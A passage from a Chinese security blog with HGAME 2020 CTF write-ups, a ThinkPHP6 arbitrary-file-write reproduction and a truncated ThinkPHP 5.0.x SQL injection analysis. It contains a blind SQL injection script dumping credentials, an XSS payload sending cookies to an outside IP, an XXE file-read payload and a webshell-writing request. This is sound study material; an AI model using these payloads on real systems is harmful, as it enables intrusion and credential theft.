disable: [&#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;, &#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;]</code></pre>
<p>一个个检测输入点发现,delete方法存在sql注入</p>
<p>注入脚本</p>
<pre><code class="python">import requests
from bs4 import BeautifulSoup
def send():

    burp0_url = &quot;http://139.199.182.61:19999/index.php?method=send&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;message&quot;: &quot;aaa&quot;}
    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    if res.status_code==200:
        return 1
    else :
        return 0

def get_id():


    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    html = res.text
    try :
        soup = BeautifulSoup(html,&#39;html.parser&#39;) #把网页解析为BeautifulSoup对象
        url=soup.find(&quot;span&quot;,class_=&quot;message&quot;).find(&quot;a&quot;)[&#39;href&#39;]
    except:
        return False
    return url.replace(&quot;index.php?method=delete&amp;delete_id=&quot;,&quot;&quot;)


def check(mesid):
    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    url=&quot;index.php?method=delete&amp;delete_id=&quot;+str(mesid)
    if url in res.text:
        return True
    return False
#index.php?method=delete&amp;delete_id=6594

def delete(mesid):
    burp0_url = &quot;http://139.199.182.61:19999/index.php&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    requests.get(burp0_url, params={&quot;method&quot;:&quot;delete&quot;,&quot;delete_id&quot;:mesid},headers=burp0_headers, cookies=burp0_cookies)


def sql_inj(sql):
    mesid=get_id()
    delete(str(mesid)+&quot; and (&quot;+sql+&quot;) #&quot;)
    if not check(mesid):
        print(&quot;%s success&quot; % sql)
        send()
        return True
    print(&quot;%s fail&quot; % sql)
    return False

# sql_inj(&quot;(select substr(hex(&#39;1&#39;),1,1))=&#39;3&#39;&quot;)
cha=&quot;0123456789ABCDEF&quot;
result=&quot;&quot;
p=0
while True:
    p+=1
    temp=&#39;&#39;
    for i in cha:
        if sql_inj(&quot;(select substr(hex(group_concat(name,&#39;,&#39;,password)),%d,1) FROM user where id=1)=&#39;%s&#39;&quot; % (p,i) ):
            result+=i
            temp=i
            print(result)
            break
    if temp!=result[-1]:
        break

#information_schema,babysql
#messages,user
#id,name,password
</code></pre>
<h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>操操操,这题对我有毒,我这里不显示csp,导致我卡了很久</p>
<p>存在csp:</p>
<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></pre><p>先检测一下</p>
<p> <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p>
<p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19319"></p>
<p>说object-src不安全</p>
<p>这个策略已经ban掉了内联脚本,所以我们直接传一个js代码过去没用</p>
<p>我们对send方法进行检测发现,会过滤script,但是用双写就可以绕过,还会把大写转成小写</p>
<p>用burp代理,查看发送的请求,我们可以会注意到<code>/send</code>会直接返回我们发送的内容,利用这个恰好可以绕过<code>script-src &#39;self&#39;</code> ,</p>
<p>我们发送以下payload(用script标签也一样)</p>
<pre><code>&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</code></pre><p>成功弹窗,但是我们还有<code>default-src &#39;self&#39;</code>阻碍着我们带回数据</p>
<p>因为没有设置<code>object-src</code>我们可以用<code>embed</code>标签带回数据</p>
<p>最后的payload</p>
<pre><code>&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;
var+iframe+%3d+eval(%22document.create\105lement(&#39;embed&#39;)%22)%3b
iframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3b
eval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p><code>hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.}</code></p>
<h3 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h3><p>一看就知道有xxe漏洞</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE r [
&lt;!ELEMENT r ANY &gt;
&lt;!ENTITY % sp SYSTEM &quot;http://127.0.0.1/dtd.xml&quot;&gt;
%sp;
%param1;
]&gt;
&lt;r&gt;&amp;exfil;&lt;/r&gt;

File stored on http://127.0.0.1/dtd.xml
&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://127.0.0.1/dtd.xml?%data;&#39;&gt;&quot;&gt;</code></pre><p>submit.php</p>
<pre><code class="php">&lt;?php
include &quot;config.php&quot;;
$result = null;
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#39;php://input&#39;);

try{
    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);
    $stmt-&gt;bindParam(&#39;:id&#39;, $id);
    $stmt-&gt;bindParam(&#39;:chal_name&#39;, $chal_name);
    $stmt-&gt;bindParam(&#39;:bd_level&#39;, $level);
    $stmt-&gt;bindParam(&#39;:bd_time&#39;, $level);

    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $id = $creds-&gt;id;
    $chal_name = $creds-&gt;name;
    $level = $creds-&gt;level;
    $time = $creds-&gt;time;
    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) {
        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;请填写信息！&quot;);
        die($result);
    }
    $stmt-&gt;execute();
    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;已提交成功，正在为您安排打手&quot;);
}catch(Exception $e){
    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;提交失败！&quot;);
}
header(&#39;Content-Type: text/html; charset=utf-8&#39;);
echo $result;
?&gt;</code></pre>
<p>config.php</p>
<pre><code class="php">&lt;?php
$dbms=&#39;mysql&#39;;
$host=&#39;localhost&#39;;
$dbName=&#39;bdctr_message&#39;;
$user=&#39;root&#39;;
$pass=&#39;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#39;;

$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));
$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

?&gt;</code></pre>
<p>原本想着用gopher执行sql语句,但是有密码无法执行</p>
<p>PDO配置错误?</p>
<p>宽字节注入?(x)</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p> <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a> </p>
<h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>就说说咋拿到密码的</p>
<p>压缩文件提示<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p>
<p>利用搜索引擎(<code>Pixiv@純白可憐</code>)拿到密码</p>
<h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>解压得到一个文本和一个压缩包</p>
<p>观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)</p>
<p>然后拿到里面的word文档,但是是加密的,猝.</p>
<p>在看一下那个文本,有点像培根密码</p>
<pre><code class="python">s=&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;.replace(&quot; &quot;,&quot;&quot;)[:-1]
result=&quot;&quot;
for i in range(0,len(s),5):
    temp=&quot;&quot;
    for j in range(5):
        if s[i+j]==s[i+j].lower():
            temp+=&quot;0&quot;
        else :
            temp+=&quot;1&quot;
    result+=chr(int(temp,2)+ord(&#39;A&#39;))
print(result)</code></pre>
<p>于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag</p>
<h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>解压得到password.txt和ok.zip</p>
<p>根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.</p>
<p>拿到一堆ook直接上谷歌.ok了</p>
<p>base32-&gt;base64-&gt;二维码</p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>直接套脚本</p>
<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><pre><code class="python">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import gmpy2
from secret import A, B, flag
assert flag.startswith(&#39;hgame{&#39;) and flag.endswith(&#39;}&#39;)

TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
MOD = len(TABLE)

cipher = &#39;&#39;
for b in flag:
    i = TABLE.find(b)
    if i == -1:
        cipher += b
    else:
        ii = (A*i + B) % MOD
        cipher += TABLE[ii]

print(cipher)
# A8I5z{xr1A_J7ha_vG_TpH410}</code></pre>
<p>我们观察可以发现这其实是个单表替换加密</p>
<p>那么我们只要生成生成一个加密表就可以很容易的求出加密内容</p>
<p>但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame</p>
<p>于是有</p>
<pre><code class="python">TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
MOD = len(TABLE)
cipher=&quot;A8I5z{xr1A_J7ha_vG_TpH410}&quot;

for A in range(1,MOD):
    for B in range(1,MOD):
        result=&quot;&quot;
        try :
            #生成加密表
            TABLE2={}
            for b in TABLE:
                i=TABLE.find(b)
                TABLE2[TABLE[(A*i + B) % MOD]]=b
            #解密
            for b in cipher:
                ii=TABLE.find(b)

                if ii==-1:
                    result+=b
                else :
                    result+=TABLE2[b]
        except :
            pass
        if &quot;hgame&quot; in result:
            print(result)
</code></pre>
<h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>覆盖变量值来执行后门函数</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/07/2020hgame/">https://explorersss.github.io/2020/02/07/2020hgame/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/02/07/2020hgame/" data-id="ck6c50yt800005cv05ad96sif" data-title="2020hgame" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2020-02-01T09:08:34.153Z" itemprop="datePublished">2020-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP6 任意文件操作漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>ThinkPHP6.0.0-6.0.1</li>
<li>开启Sessoin中间件</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
<p>复现环境为:phpstudy+thinkphp6.0.1</p>
<p><code>\app\controller\index.php</code>:</p>
<pre><code class="php">&lt;?php
namespace app\controller;

use app\BaseController;
use think\facade\Session;
class Index extends BaseController
{
    public function index($name)
    {
        Session::set(&#39;name&#39;, $name);
        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;
    }

}</code></pre>
<p><code>\app\middleware.php</code></p>
<pre><code class="php">&lt;?php
// 全局中间件定义文件
return [
    // 全局请求缓存
    // \think\middleware\CheckRequestCache::class,
    // 多语言加载
    // \think\middleware\LoadLangPack::class,
//     Session初始化
     \think\middleware\SessionInit::class
];</code></pre>
<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
<pre><code class="php">public function save(): void
    {
        $this-&gt;clearFlashData();//清除原来的数据

        $sessionId = $this-&gt;getId();

        if (!empty($this-&gt;data)) {
            $data = $this-&gt;serialize($this-&gt;data);

            $this-&gt;handler-&gt;write($sessionId, $data);
        } else {
            $this-&gt;handler-&gt;delete($sessionId);
        }

        $this-&gt;init = false;
    }</code></pre>
<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
<pre><code class="php">public function write(string $sessID, string $sessData): bool
    {
        $filename = $this-&gt;getFileName($sessID, true);
        $data     = $sessData;

        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        return $this-&gt;writeFile($filename, $data);
    }</code></pre>
<p>再跟进<code>$this-&gt;writeFile</code></p>
<pre><code class="php">protected function writeFile($path, $content): bool
    {
        return (bool) file_put_contents($path, $content, LOCK_EX);
    }</code></pre>
<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
<p>跟进去</p>
<pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string
    {
        if ($this-&gt;config[&#39;prefix&#39;]) {
            // 使用子目录
            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;
        } else {
            $name = &#39;sess_&#39; . $name;
        }

        $filename = $this-&gt;config[&#39;path&#39;] . $name;
        $dir      = dirname($filename);

        if ($auto &amp;&amp; !is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        return $filename;
    }</code></pre>
<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
<pre><code class="php">    public function getId(): string
    {
        return $this-&gt;id;
    }</code></pre>
<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
<pre><code class="php">    public function setId($id = null): void
    {
        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
    }</code></pre>
<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32</code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
<p>查找调用setId的函数</p>
<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
<p>其中<code>SessionInit</code></p>
<pre><code class="php">    public function handle($request, Closure $next)
    {
        // Session初始化
        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);
        $cookieName   = $this-&gt;session-&gt;getName();

        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
            $sessionId = $request-&gt;request($varSessionId);
        } else {
            $sessionId = $request-&gt;cookie($cookieName);
        }

        if ($sessionId) {
            $this-&gt;session-&gt;setId($sessionId);
        }
    }</code></pre>
<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
<p>因此构造payload</p>
<pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E

Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php

访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><pre><code class="php">public function setId($id=null):void
{
    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());
}</code></pre>
<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/01/ThinkPHP6">https://explorersss.github.io/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/](<a href="https://explorersss.github.io/2020/02/01/ThinkPHP6">https://explorersss.github.io/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ck63djezb0000o8v04w16g3iy" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP框架5.0.x_SQL注入分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2020-02-01T04:53:15.310Z" itemprop="datePublished">2020-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ThinkPHP框架5.0.x_SQL注入分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露"><a href="#ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露" class="headerlink" title="ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露"></a>ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露</h1><h2 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h2><p>开启debug模式的thinkphp5.0.x</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从官网上下载5.0.9完整版</p>
<p><code>application/index/controller/index.php</code>内容如下</p>
<pre><code class="php">&lt;?php
namespace app\index\controller;

use app\model\Gather;

class Index
{
    public function index()
    {
        $ids = input(&#39;ids/a&#39;);
        $t = db(&quot;user&quot;);
        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();

    }
}
</code></pre>
<p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们在漏洞的关键位置下个断点进行分析,<code>thinkphp\library\think\db\Builder.php</code>:383行</p>
<p>调用堆栈为:</p>
<p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p>
<p>从index()方法开始</p>
<pre><code class="php">public function index()
    {
        $ids = input(&#39;ids/a&#39;);
        $t = db(&quot;user&quot;);
        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();

    }</code></pre>
<p>调用<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>返回值的select()方法</p>
<p>我们先看下select()方法,它会将<code>$option</code>作为参数调用<code>Builder::select</code>方法</p>
<pre><code class="php">public function select($data = null)
    {
        ...

        // 分析查询表达式
        $options = $this-&gt;parseExpress();

        ...
        if (!$resultSet) {
            // 生成查询SQL
            $sql = $this-&gt;builder-&gt;select($options);
            // 获取参数绑定
            ...
            }

            ...

    }</code></pre>
<p>我们跟进<code>$this-&gt;parseExpress();</code>看<code>$option</code>是如何生成的</p>
<pre><code class="php">protected function parseExpress()
    {
        $options = $this-&gt;options;
        ...
    }</code></pre>
<p>这里是直接令<code>$options = $this-&gt;options;</code>,而<code>$this-&gt;options</code>是<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>过程生成的</p>
<p>跟进去发现有这一条语句 <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,其中<code>$where</code>由<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>得到</p>
<p>获得<code>$option</code>的调用链为:</p>
<p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null)</code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p>
<p>我们回到<code>$this-&gt;builder-&gt;select($options);</code>,现在我们知道<code>$this-&gt;options[&#39;where&#39;][$logic]</code>是我们的可控位置</p>
<p>跟进去</p>
<pre><code class="php">public function select($options = [])
    {
        $sql = str_replace(
            [&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;],
            [
                $this-&gt;parseTable($options[&#39;table&#39;], $options),
                $this-&gt;parseDistinct($options[&#39;distinct&#39;]),
                $this-&gt;parseField($options[&#39;field&#39;], $options),
                $this-&gt;parseJoin($options[&#39;join&#39;], $options),
                $this-&gt;parseWhere($options[&#39;where&#39;], $options),
